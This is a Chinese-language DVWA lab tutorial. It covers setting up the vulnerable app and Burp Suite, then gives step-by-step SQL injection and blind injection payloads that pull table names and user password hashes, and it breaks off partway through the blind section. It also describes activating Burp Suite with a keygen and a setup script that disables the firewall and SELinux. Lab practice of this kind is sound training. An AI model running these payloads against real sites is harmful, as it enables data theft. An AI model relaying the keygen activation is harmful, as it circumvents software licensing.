# DVWA通关教程

**本教程不会对靶场打靶的时候php代码进行分析，因为实际情况你是很难拿到后端的代码的，这里讲究的就是一个黑盒测试，在什么都不知道的情况下进行注入，难度是比较高的，但是这种思路是必须有的；靶场通关不会讲原理只讲思路，原理我会专门出一本web安全；PHP代码函数简介会单独写在教程后面，并对源码进行分析。**

## DVWA靶场搭建

### Linux中部署靶场

#### LAMP部署

这里以CentOS为例来进行环境部署，我更推荐使用CentOS。

首先创建一个脚本文件，命为LAMP.sh即可。

```shell
vim LAMP.sh
```

然后就可以进行下面的脚本编写

**LAMP shell脚本一键部署**

```shell
#!/bin/bash
# 安装apache,mariadb(CS),php
echo "安装Apache-------------------------------------------"
yum install -y httpd
echo "安装mariadb数据库------------------------------------"
yum install -y mariadb-server
yum install -y mariadb
echo "安装PHP开发环境--------------------------------------"
yum install -y php
yum install -y php-json
yum install -y php-fpm
yum install -y php-mysql
yum install -y php-gd
# 启动apache,mariadb服务
echo "启动Apache服务---------------------------------------"
systemctl start httpd
echo "检查Apache的进程-------------------------------------"
netstat -tunlp | grep httpd
echo "查看Apache的启动装状况--------------------------------"
systemctl status httpd
echo "开启mariadb服务--------------------------------------"
systemctl start mariadb
echo "查看mariadb的进程------------------------------------"
netstat -tunlp | grep mysql
systemctl status mariadb
# 设置为开机自启动
systemctl enable httpd
systemctl enable mariadb
# 关闭防火墙
if systemctl stop firewalld
then
echo "防火墙已关闭-----------------------------------------"
fi
if setenforce 0
then
echo "SELINUX安全模块已关闭--------------------------------"
fi
sleep 2
echo "当前的防火墙状态：-----------------------------------"
systemctl status firewalld
```

#### DVWA部署

设置数据库密码进入数据库，注意只有数据库开启的状态才能使用以下命令设置密码。

```shell
mysqladmin -uroot password '123456'
```

下载dvwa靶场文件，为了靶场的完整性，请在GIthub上进行下载。

```shell
# 解压压缩包
unzip DVWA-master.zip
# 创建dvwa目录
[root@CentOS7 admin] mkdir -p /var/www/html/dvwa
[root@CentOS7 admin] ls /var/www/html/
dvwa
# 移动当前目录到html的目录下
mv DVWA-master /var/www/html/dvwa
# 检验
[root@CentOS7 admin] mv DVWA-master /var/www/html/dvwa
[root@CentOS7 admin] ls /var/www/html/dvwa/
DVWA-master
[root@CentOS7 admin] ls /var/www/html/dvwa/DVWA-master/
about.php docs ids_log.php phpinfo.php README.fr.md SECURITY.md
 vulnerabilities
CHANGELOG.md dvwa index.php php.ini README.md security.php
config external instructions.php README.ar.md README.tr.md security.txt
COPYING.txt favicon.ico login.php README.es.md README.zh.md setup.php
database hackable logout.php README.fa.md robots.txt tests
# 切换到当前目录
[root@CentOS7 admin] cd /var/www/html/dvwa
```

进入数据库，创建dvwa用户和数据库：

```shell
MariaDB [(none)]> create user 'dvwa'@'%' identified by '1234';
Query OK, 0 rows affected (0.00 sec)
MariaDB [(none)]> grant all privileges on *.* to 'dvwa'@'localhost';
Query OK, 0 rows affected (0.00 sec)
MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.00 sec)

# 创建数据库
MariaDB [(none)]> show databases;
+--------------------+
| Database |
+--------------------+
| information_schema |
| MineCraft |
| ZQL |
| mysql |
| performance_schema |
| test |
| web |
+--------------------+
7 rows in set (0.01 sec)
MariaDB [(none)]> create database dvwa;
Query OK, 1 row affected (0.00 sec)
```

尝试使用dvwa用户登录数据库；

```shell
[root@CentOS7 ~] mysql -udvwa -p
Enter password:
ERROR 1045 (28000): Access denied for user 'dvwa'@'localhost' (using password: YES)
```

出现这种情况是因为密码没有被初始化；

```shell
# 初始化密码
[root@CentOS7 DVWA-master] mysqladmin -udvwa password '1234'
```

再次尝试登录；

```shell
[root@CentOS7 ~] mysql -udvwa -p
Enter password:
Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MariaDB connection id is 19
Server version: 5.5.68-MariaDB MariaDB Server
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>
```

修改配置文件

```shell
# 进入到当前路径
[root@CentOS7 config] ls
config.inc.php.dist
[root@CentOS7 config] pwd
/var/www/html/dvwa/DVWA-master/config
# 拷贝源文件
[root@CentOS7 config] cp config.inc.php.dist config.inc.php
[root@CentOS7 config] ls
config.inc.php config.inc.php.dist
# 修改配置文件
[root@CentOS7 DVWA-master] vim /etc/httpd/conf/httpd.conf
119 DocumentRoot "/var/www/html"
120
121 TypesConfig /etc/mime.types
122 AddType application/x-httpd-php .php
123 AddType application/x-httpd-php-source .phps
124 DirectoryIndex index.php index.html
125
126
127 #
128 # Relax access to content within /var/www.
129 #
130 <Directory "/var/www/html">
131 AllowOverride None
132 # Allow open access:
133 Require all granted
134 </Directory>
# 重新载入文件
[root@CentOS7 DVWA-master] systemctl reload httpd
```

输入本机的IP/路径/：http://192.168.8.121/dvwa/DVWA-master/进入网页；

![image-20230518085708033](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518085708033.png)

当然第一次进入会登录，用户为admin，密码为password；

创建数据库；

![image-20230518085756335](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518085756335.png)

创建成功后页面下面会出现以下内容：

![image-20230518085828505](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518085828505.png)

---

### Windows靶场搭建

#### 安装PHPstudey

在网站搜索PHPstudypro即可找到官网进行下载安装：https://www.xp.cn/download.html

安装号之后就是这样的：

![image-20230518090318301](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090318301.png)

启动apache与MySQL服务。

将下载好的文件解压到该路径下：

![image-20230518090410753](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090410753.png)

#### 配置靶场

修改配置文件，找到config文件目录，将该文件copy一份，并将其格式改为php

![image-20230518090455311](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090455311.png)

修改文件内容，将以下内容改为对应的数据库的账户和密码：

![image-20230518090516328](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090516328.png)

#### 创建网站

点击创建网站，内容如下

![image-20230518090604715](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090604715.png)

**注意：域名内容随意、目录选择DVWA即可，重启apache服务才能生效**

在浏览器输入本地的IP

![image-20230518090644772](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090644772.png)

进入127.0.0.1/setup.php进行数据库的创建

![image-20230518090719782](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090719782.png)

点击左下角的按钮crete/Reset Databases

![image-20230518090735470](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090735470.png)

出现以上内容表示创建成功；

![image-20230518090823994](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518090823994.png)

以上就是在Windows上搭建靶场的过成。

## BP环境准备(BurpSuite)

### 安装Firefox

在官网上下载安装包，然后双击安装即可。

---

### 安装JDK8

下载jdk8可以在官网上进行下载，下载好之后双击安装即可

#### 配置Java8的环境变量

打开系统的高级设置，在里面添加好Java8的环境变量。

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518091834106.png" alt="image-20230518091834106" align="left" />

选中以下内容：

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518091902047.png" alt="image-20230518091902047" align="left" />

将Java8的bin文件安装的路径复制下来，添加到环境变量中即可；

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092013339.png" alt="image-20230518092013339" align="left" />

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092029007.png" alt="image-20230518092029007" align="left" />

检查是否能运行Java和Javac；

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092054950.png" alt="image-20230518092054950" align="left" />

javac无法运行，所以还需要再添加一个HOME变量和CLASSPATH，注意jdk1.8之后不用配置后面两个

<img align="left" src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092130113.png" alt="image-20230518092130113" />

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092141631.png" alt="image-20230518092141631" align="left" />

再次运行javac

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092227459.png" alt="image-20230518092227459" align="left" />

此时Java8的环境变量就配置成功了。

---

### 安装BurpSuite

双击包中的burp-loader-keygen.jar，这是一个Java的运行程序，可以帮我们获取产品密钥。

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092328008.png" alt="image-20230518092328008" align="left" />

点击右边的run，运行

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092348404.png" alt="image-20230518092348404" align="left" />

之后会出现如下界面；

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092405217.png" alt="image-20230518092405217" align="left" />

点击右下角的我同意的英文(I Accept)，将下面的激活码复制进入上面的产品激活码的复选框之中，然后点击下一步，进入以下界面：

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092426884.png" alt="image-20230518092426884" align="left" />

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092456656.png" alt="image-20230518092456656" align="left" />

点击手动激活英文为(Manual activation)：

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092514634.png" alt="image-20230518092514634" align="left" />

将第二栏的激活码复制粘贴到jar运行程序的(Activation Request)中；

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092533049.png" alt="image-20230518092533049" align="left" />

最后一行会自动出现，将最后一个复选框内的内容粘贴到Burp的第三栏中：

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092602727.png" alt="image-20230518092602727" align="left" />

点击下一步：（完成激活）

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092616869.png" alt="image-20230518092616869" align="left" />

---

### 配置Firefox的代理

获取bp的CA证书，打开burp点击代理，点击导出CA证书

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092849481.png" alt="image-20230518092849481" align="left" />

选择第一种格式

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092908452.png" alt="image-20230518092908452" align="left" />

输入以下内容；

![image-20230518092927877](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092927877.png)

![image-20230518092939222](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518092939222.png)

导入证书到firefox，在设置里面搜索证书；

![image-20230518093019983](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093019983.png)

点击导入；

![image-20230518093043680](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093043680.png)

![image-20230518093116999](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093116999.png)

勾选信任证书；

![image-20230518093136732](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093136732.png)

---

### 安装代理插件

![image-20230518093223685](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093223685.png)

![image-20230518093239155](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093239155.png)

![image-20230518093251600](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093251600.png)

进入如下界面：

![image-20230518093312778](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093312778.png)

修改以上内容：

![image-20230518093350891](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518093350891.png)



## SQL注入通关

### 简介

SQL Injection，即 SQL 注入，是指攻击者通过注入恶意的 SQL 命令，破坏SQL 查询语句的结构，从而达到执行恶意 SQL 语句的目的。SQL 注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL 注入仍是现在最常见的 Web 漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的 SQL 注入漏洞。

---

### 思路

1.判断是否存在注入，注入是字符型还是数字型

2.猜解 SQL 查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据

----

### SQL Injection Low

切换把靶场的等级为Low，默认是impossible；

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230518091209231.png" alt="image-20230518091209231" style="zoom:80%;" align="left" />

**SQL注入的步骤大同小异，所有的SQL注入大致可以分为一下几个步骤：**

> **寻找网页的注入点，辨别其注入点的类型**
>
> **判断字段的长度和回显信息**
>
> **判断数据库的信息，数据库的类型**
>
> **查找数据库名**
>
> **查找数据表名**
>
> **查找全部的字段**
>
> **查找字段内的全部信息**
>
> **猜测账号密码**
>
> **管理员后台登陆**

#### 寻找注入点

**首先寻找注入点，判断他的注入类型**

尝试一下的payload：

```
1
1 and 1=1
1 and 1=2
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 173246-1684372364209-2.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 173316-1684372364208-1.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 173406-1684372364209-4.png)

三条语句都返回了正确的答案，最后一条SQL语句注入后，在MySQL数据库中是语法错误的，但是也返回了正确的答案，说明这里不是数字型注入点。

尝试使用下面的payload：

```
1'
1' and '1'='1
1' and '1'='2
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 173957-1684372364209-3.png)

输入1的时候SQL语句在数据库内报错，返回到了页面，语法错误，说明我们的语句拼凑错误。

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 173858-1684372364209-5.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 173737-1684372364209-6.png)

输入语句1' and '1'='1和1' and '1'='2的返回结果截然不同，这两句话在数据库内是这样拼凑的，如下：

```sql
SQL语句：select ... from ... where '1' and '1'='1'
SQL语句：select ... from ... where '1' and '1'='2'
```

默认情况下字符注入的时候前后是存在引号的，如果像第一次输入1’一样语句就变成了这样：**`select ... from ... where '1''`**这样的语句是错误的sql语句，所以页面会返回错误。当换成后面两种语句的时候，语句的拼接是没有问题的，**根据逻辑符号前后的布尔值来返回数据**，`and`关键字只有全部为True的时候才是True，这里1明显不等于2，是False，所以语句没有返回值。

以上结果表明该网站存在字符型注入点。

#### 猜解字段的长度和回显信息

##### 猜解字段的长度

要想知道字段的长度就需要用到SQL的**`关键字order by`**，**order by的作用就是查询结构和排序**，这里主要是查询结构的功能来进行注入。

使用一下payload进行注入：

```
1’ order by 1 #
1’ order by 1 --+
```

为什么要在以上的语句后面添加#或者--+(可以换成-- ，因为SQL语句的原注释符号就是这个)，因为这是注释符号，我们在字符1的后面添加了引号，所以会造成语句错误，**需要在插入的语句中使用注释符号来无效后面的语句**。SQL语句在数据库中就是这样的：

```sql
SQL语句：select ... from ... where '1' order by 1 #'
SQL语句：select ... from ... where '1' order by 1 -- '
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 175454-1684372364209-7.png)

**很遗憾，这个地方无法使用另外一种注释符号：-- 或者--+**

变换order by后面的数值即可查询到有字段长度有多少。

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 180142-1684372364209-8.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 180209-1684372364209-9.png)

很明显到3就报错了，说明字段长度是2。

##### 回显信息(判断回显位置)

要想判断回显有多少位，就要使用到关键字union来实现联合查询。

尝试使用以下payload：

```sql
1' union select 1,2 #
```

为什么要使用该语句，因为利用联合查询的机制可以查出有哪些字段和信息，在数据库中是可以直接利用该语句进行查看的。

看看该效果就知道原理了：

```sql
mysql> select * from users union select 1,2,3;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
|  1 | 2        | 3          |
+----+----------+------------+
14 rows in set (0.03 sec)

mysql> select * from users union select 1,2;
1222 - The used SELECT statements have a different number of columns
```

数字就是用来回显的，如果后面的数字不能和前面的字段数相匹配就会报错，只有匹配了才有结果。

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 180651-1684372364209-10.png)

#### 获取当前数据库名

要想获取到数据库的名字我们需要借助**函数database()**来实现，因为该**函数会返回当前的数据库的名字。**

payload：

```
1' union select 1,database() #
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 181616-1684372364209-14.png)

通过该方式我们就获取到了数据库的名字，名字叫做dvwa，用户还是admin

#### 获取数据表名

要想获取数据库的表名，我们需要借助关键字**information**、**schema**、**table_name**等关键字，因为**information_schema是MySQL的内置的数据库**。

payload：

```
1' untion select 1,table_name from information_schema.tables where table_schema='dvwa' #
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 194815-1684372364209-11.png)

此时返回了两个数据表：guestbook、users，很明显users才是我们需要的表，里面有我们需要的账户 和密码。

#### 获取数据库字段名

获取字段名只需要修改上一条payload的关键字，将其修改为column即可，因为column代表的是字段的意思，还需要借助函数group_concat()

```
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 195435-1684372364209-13.png)

此时获取到一些字段，**user_id,first_name,last_name,user,password**等信息，很明显字段user和password是我们需要的。

#### 获取字段内的信息

获取字段内的信息需要借助函数concat_ws()。

payload：

```
1' union select group_concat(user_id,first_name,last_name),group_concat(password)
from users #
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-22 195725-1684372364209-12.png)

此时返回了一条加密的信息，只需要将其解密即可获得账户和密码。

```
账户：
1adminadmin,
2GordonBrown,
3HackMe,
4PabloPicasso,
5BobSmith
密码：
5f4dcc3b5aa765d61d8327deb882cf99,
e99a18c428cb38d5f260853678922e03,
8d3533d75ae2c3966d7e0d4fcc69216b,
0d107d09f5bbe40cade3de5c71e9e9b7,
5f4dcc3b5aa765d61d8327deb882cf99。
```

那么那一条才是我们需要的密码呢？

用户也加密了，我们看出现频率最高的字母，将其组合即可获得账户名，很明显字母a，d，n，i出现的频率较高，而且第一行admin看着就像关键字，很有可能是账户名，先暂时定为用户名，如果不确定，可以直接找到对应的算法进行解密。

密码里面有两行加密信息是一样的，很可能是密码的密文，再来分析一下密码特征，长度是32位，是32个16进制字符，很可能是MD5加密，如果不确定，可以用工具试一试。

这里可以使用解密工具，挨个尝试。

---

### SQL Injection Middle

**BurpSuite代理开启**

在firefox中打开我们的代理插件SwitchyOmega，将其改为Burp

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 150451-1684374084196-29.png)

Burp的内容如下：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 150717-1684374084196-30.png)

打开BurpSuite，找到代理，将拦截开启，在DVWA里面选择数据，然后点击submit获取到一下内容：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 150529-1684374084197-31.png)

选中改请求内容，右键添加到Repeater(重放器)里面。

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 150545-1684374084197-32.png)

进入Repeater重放器中：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 150302-1684374084197-33.png)

#### 寻找注入点

首先尝试使用数字进行注入，对请求体进行注入，使用一下payload：

```sql
id=1 #&Submit=Submit
id=1 and 1=1 #&Submit=Submit
id=1 and 1=2 #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 150302-1684374084197-33.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 151322-1684374084197-34.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 151457-1684374084197-35.png)

可以看见最后一条语句的**逻辑结果是False**，所以是**不会返回结果的**，这里表明，该网页的注入点是**数字型的注入点**。

#### 猜解数据库字段数和回显信息

##### 猜解数据库字段数

猜测字段数目就需要使用SQL语句的关键词order by。借助order by来知晓字段数。

payload：

```sql
id=1 order by 1 #&Submit=Submit
id=1 order by 2 #&Submit=Submit
id=1 order by 3 #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 153248-1684374084197-36.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 153309-1684374084197-37.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 153324-1684374084197-38.png)

当输入3的时候返回了一条语句**Unknown column '3' in 'order clause'**没有第三列，说明只存在两个字段。

##### 回显信息

回显信息需要用到union联合查询语句，借助联合查询来获取信息。

payload：

```sql
id=1 union select 1 #&Submit=Submit
id=1 union select 1,2 #&Submit=Submit
id=1 union select 1,2,3 #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 153730-1684374084197-39.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 153657-1684374084197-40.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 153713-1684374084197-41.png)

只有第二条语句做出了回显，更加确信这是两个字段，回显出了信息1，2，和admin、admin。

#### 获取数据库名

获取数据库的名字要借助函数database，该函数会返回当前使用的数据库的名字。当前网页使用的数据库的名字就会暴露。

payload：

```sql
id=1 union select 1,database() #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 154258-1684374084197-42.png)

此时返回了一条关键的信息，DVWA，说明数据库的名字叫做dvwa。

#### 获取数据表名

若要获取数据表的名字就需要关键字information_schema,table_name等关键字，还需要借助函数group_concat()。

payload：

```sql
id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa' #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 154803-1684374084197-43.png)

尝试使用上面的payload注入的时候没有拿到数据表的信息，反馈了一个错误，错误里面有个关键信息：**You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'dvwa\' #' at line 1**在数据库名字前面有一个转义符号`\`，这很显然是基于WAF的防御手段。

尝试转码来替换dvwa的字符：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 161437-1684374084197-44.png)

上面将其转化位16进制再进行注入，得到以下结果：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 162412-1684374084197-46.png)

这里通过字符转码获取到了数据表的信息，也可以直接使用**函数database()来进行注入**

**注意：使用16进制码注入的时候前面要加上0x。**

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 161621-1684374084197-45.png)

这里明显注入成功了，获取到了两张表**guestbook,users**

#### 获取数据表的字段

获取字段需要新的关键字column，利用此关键字来进行注入。

payload：

```sql
id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 162216-1684374084197-47.png)

这里注入失败了，还是有转义符号在这里影响，尝试转码。

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 162711-1684374084197-48.png)

转码后进行注入：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 162946-1684374084197-49.png)

这里获取到了信息：user_id,first_name,last_name,user,password,avatar,last_login,f等信息，很明显字段**user,password**是我们最关心的。

#### 获取字段信息，登陆账号

payload：

```sql
id=1 union select 1,concat_ws('',user,password) from users #&Submit=Submit
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 163606-1684374084197-50.png)

这里还是利用转义符号添加的安全机制尝试转码

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 163736-1684374084197-52.png)

这里可以使用URL地址码，也可以实现注入，这就是宽字节注入，**%27%27**只不过要在后面添加一个单引号闭合，但是这里是不能实现的，**因为URL在进入数据库的时候会被直接转换为单引号，还是会报错，也就是在进入数据库之前转换的，而16进制码是进入数据库让数据库转换的，所以不会报错。**

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 163540-1684374084197-51.png)

最后将获取到的密码进行解密即可。

---

### SQL Injection High

#### 寻找注入点

Higth级别的有如何，老套路，先寻找注入先，尝试输入以下值：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 171457-1684374204263-78.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 171923-1684374204263-77.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 171944-1684374204263-82.png)

逻辑结果为False，但是返回了结果，说明此处不是字符型的注入点。

输入1‘的时候就出现了错误：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 171536-1684374204263-79.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 171556-1684374204263-80.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 172211-1684374204263-81.png)

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 172229-1684374204263-83.png)

说明此处的注入点是字符型注入点。

#### 回显信息

尝试输入下面的payload

```sql
1' order by 1
1' order by 2
1' order by 3
1' order by 4
1' order by 5
```

全是以下返回：

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 171536-1684374204263-79.png)

说明order by在这里不再适用。



尝试下面的payload：

```sql
1' union select 1,2# 
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 172859-1684374204263-85.png)

利用联合查询来获取信息。



#### 获取数据库和版本

```sql
-1' union select database(),version() # 
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 172926-1684374204263-84.png)

#### 获取数据表名

```sql
1' union select (select group_concat(table_name) from information_schema.tables where table_schema='dvwa'),2#
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 172951-1684374204263-86.png)

#### 获取字段名

```sql
-1' union select (select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),2# 
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 173023-1684374204263-88.png)

#### 获取字段内的信息

```sql
-1' union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 
```

![](D:\Document\My_book\My_Books\钟全龙著\img\屏幕截图 2023-03-23 173044-1684374204263-87.png)

通过常规的爆破手段来获取账户和密码，最后拿到密码解密即可。

## SQL盲注通关

### 简介

SQL Injection（Blind），即 SQL 盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的 SQL 注入漏洞大多是 SQL 盲注。

---

### 思路

1.判断是否存在注入，注入是字符型还是数字型

2.猜解当前数据库名

3.猜解数据库中的表名

4.猜解表中的字段名

5.猜解数据

-----

### SQL injection Blind Low

#### 寻找注入点

```
payload：1
```

![image-20230330171331743](D:\Document\My_book\My_Books\钟全龙著\img\image-20230330171331743.png)

```
payload：
1 and 1=1
1 and 1=2
```

返回结果：

![image-20230330171806445](D:\Document\My_book\My_Books\钟全龙著\img\image-20230330171806445.png)

此处表示该地方不是数字型注入点。

```
payload：
1'
1' and '1'='1#
1' and '1'='2#
```

![image-20230330172006376](D:\Document\My_book\My_Books\钟全龙著\img\image-20230330172006376.png)

返回结果中还有Missing，没有信息的意思，所以这里是字符型注入点。

#### 获取数据库字长度

```
payload：
1' and length(database())
```

![image-20230330172006376](D:\Document\My_book\My_Books\钟全龙著\img\image-20230330172006376.png)

```
payload：
1' and length(database())=1#
1' and length(database())=2#
1' and length(database())=3#
1' and length(database())=4#
```

当我们输入到4的时候就出现的新的返回内容：

![image-20230330172750860](D:\Document\My_book\My_Books\钟全龙著\img\image-20230330172750860.png)

#### 猜数据库名

```
payload：
1' and ascii(substr(database(),1,1))>97#
1' and ascii(substr(database(),1,1))<122#
```

![image-20230330174127400](D:\Document\My_book\My_Books\钟全龙著\img\image-20230330174127400.png)

暴力猜测，通过修改前面的数值即可，推荐使用BurpSuite，利用字典进行遍历来获取，通过该方法得到数据库的名字。

#### 猜数据库的表名

```
1' and (select count(table_name) from information_schema.tables where table_schema=database())=1#
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#
```

![image-20230405123256298](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405123256298.png)

当输入第二条的时候会烦了关键字Exits，说明该数据库存在两张表

![image-20230405123831669](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405123831669.png)

#### 猜测数据表的表名

输入以下payload：

```
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1#

1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9#

1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,2))=1#

1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,2))=5#
```

第一条payload返回结果如下：

![image-20230405124739029](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405124739029.png)

第二条payload返回结果：

![image-20230405124842840](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405124842840.png)

第三条payload：

![image-20230405124933173](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405124933173.png)

第四条payload返回结果：

![image-20230405125002271](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405125002271.png)

以上结果说明第一个表是九个字符，第二个表是5个字符。

接下来猜测表名。

```
payload:
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97#

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122#
```

